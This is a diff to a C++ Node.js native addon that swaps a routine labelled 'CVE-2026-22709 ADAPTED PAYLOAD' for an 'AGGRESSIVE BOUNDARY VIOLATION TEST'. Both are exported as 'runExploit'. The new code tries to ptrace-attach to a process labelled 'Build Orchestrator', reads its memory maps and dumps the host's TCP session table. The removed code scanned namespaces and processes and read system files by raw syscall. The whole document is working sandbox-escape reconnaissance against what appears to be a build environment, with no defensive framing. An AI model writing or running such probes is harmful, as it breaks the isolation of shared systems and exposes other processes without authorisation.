@@ -2,73 +2,56 @@
 #include <sys/syscall.h>
 #include <unistd.h>
 #include <fcntl.h>
-#include <sys/stat.h>
-#include <dirent.h>
+#include <sys/ptrace.h>
+#include <sys/wait.h>
+#include <errno.h>
 #include <string>
-#include <vector>
-#include <fstream>
-#include <ctype.h>
+#include <cstring>
 
-std::string direct_read(const char* path) {
-    char buf[1024];
-    int fd = syscall(SYS_open, path, O_RDONLY);
-    if (fd < 0) return "SYS_OPEN_FAILED";
+std::string test_ptrace(int target_pid) {
+    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) < 0) {
+        return "PTRACE_ATTACH FAILED: " + std::string(strerror(errno));
+    }
+    waitpid(target_pid, NULL, 0);
+    ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
+    return "SUCCESS: PTRACE_ATTACH TO PID " + std::to_string(target_pid) + " ALLOWED!";
+}
 
-    int n = syscall(SYS_read, fd, buf, 1023);
-    syscall(SYS_close, fd);
-
-    if (n <= 0) return "SYS_READ_EMPTY";
+std::string read_proc_mem(int target_pid) {
+    std::string path = "/proc/" + std::to_string(target_pid) + "/maps";
+    int fd = open(path.c_str(), O_RDONLY);
+    if (fd < 0) return "READ_MAPS FAILED: " + std::string(strerror(errno));
+    
+    char buf[512];
+    int n = read(fd, buf, 511);
+    close(fd);
     buf[n] = '\0';
-    return std::string(buf);
+    return "MAPS SNIPPET: " + std::string(buf);
 }
 
-std::string check_namespaces() {
-    std::string report = "--- NAMESPACE INTEGRITY CHECK ---\n";
-    const char* ns_paths[] = {"/proc/self/ns/net", "/proc/self/ns/uts", "/proc/self/ns/mnt"};
-
-    for (const char* path : ns_paths) {
-        char link[256];
-        ssize_t len = readlink(path, link, sizeof(link)-1);
-        if (len != -1) {
-            link[len] = '\0';
-            report += std::string(path) + " -> " + std::string(link) + "\n";
-        }
-    }
-    return report;
+std::string test_internal_conn() {
+    int fd = open("/proc/net/tcp", O_RDONLY);
+    if (fd < 0) return "NET_TCP_READ FAILED";
+    char buf[1024];
+    read(fd, buf, 1023);
+    close(fd);
+    return "ACTIVE_TCP_SESSIONS: \n" + std::string(buf);
 }
 
-std::string scan_pids() {
-    std::string report = "--- PROCESS VISIBILITY SCAN ---\n";
-    DIR* dir = opendir("/proc");
-    struct dirent* ent;
-    while ((ent = readdir(dir)) != NULL) {
-        if (isdigit(ent->d_name[0])) {
-            std::string cmd_path = std::string("/proc/") + ent->d_name + "/comm";
-            std::ifstream comm(cmd_path);
-            std::string cmd_name;
-            if (comm >> cmd_name) {
-                report += "PID " + std::string(ent->d_name) + ": " + cmd_name + "\n";
-            }
-        }
-    }
-    closedir(dir);
-    return report;
-}
-
-napi_value RunExploit(napi_env env, napi_callback_info info) {
-    std::string final_report = "--- CVE-2026-22709 ADAPTED PAYLOAD ---\n";
-    final_report += check_namespaces();
-    final_report += scan_pids();
-    final_report += "\n[DIRECT SYSCALL TEST]\n";
-    final_report += "/etc/hostname: " + direct_read("/etc/hostname");
+napi_value AggressiveTest(napi_env env, napi_callback_info info) {
+    std::string report = "--- AGGRESSIVE BOUNDARY VIOLATION TEST ---\n";
+    
+    report += "[1] PTrace Build Orchestrator: " + test_ptrace(410) + "\n";
+    report += "[2] Memory Maps Build: " + read_proc_mem(410) + "\n";    
+    report += "[3] Internal Network Leak: " + test_internal_conn() + "\n";
 
     napi_value res;
-    napi_create_string_utf8(env, final_report.c_str(), final_report.length(), &res);
+    napi_create_string_utf8(env, report.c_str(), report.length(), &res);
     return res;
 }
 
 napi_value Init(napi_env env, napi_value exports) {
-    napi_property_descriptor desc = { "runExploit", 0, RunExploit, 0, 0, 0, napi_default, 0 };
+    napi_property_descriptor desc = { "runExploit", 0, AggressiveTest, 0, 0, 0, napi_default, 0 };
     napi_define_properties(env, exports, 1, &desc);
     return exports;
 }
